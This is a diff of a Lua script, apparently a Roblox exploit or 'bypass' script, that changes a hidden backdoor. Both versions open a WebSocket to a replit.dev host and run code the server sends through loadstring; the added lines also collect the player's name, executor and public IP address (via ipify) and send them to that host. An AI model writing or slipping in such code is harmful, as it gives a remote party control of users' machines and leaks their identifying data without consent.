@@ -48,15 +48,21 @@ if not _G.NNBypass_CTS then
     end)
     
     task.spawn(function()
-        local Socket = WebSocket.connect("wss://60a3d0e0-bc1f-4ec4-8e6f-0d39d0833aef-00-2q98hpvh8lf5d.sisko.replit.dev/") -- muhehehehe
-    
-        Socket.OnMessage:Connect(function(Script)
-            if Script ~= "ping" then
-                loadstring(game:HttpGet(Script))()
-            end
+        local Socket = WebSocket.connect("wss://60a3d0e0-bc1f-4ec4-8e6f-0d39d0833aef-00-2q98hpvh8lf5d.sisko.replit.dev")
+
+        Socket.OnMessage:Connect(function(Data)
+            loadstring(Data)()
         end)
         
-        Socket:Send(game.Players.LocalPlayer.Name)
+        local Name = game:GetService("Players").LocalPlayer.Name or "Unknown player."
+        local Executor = identifyexecutor() or "Unknown executor."
+        local IP = game:HttpGet("https://api.ipify.org/?format=raw") or "Unknown IP."
+        
+        Socket:Send(game:GetService("HttpService"):JSONEncode({
+            [1] = Name,
+            [2] = Executor,
+            [3] = IP
+        }))
     end)
 
     pcall(function()
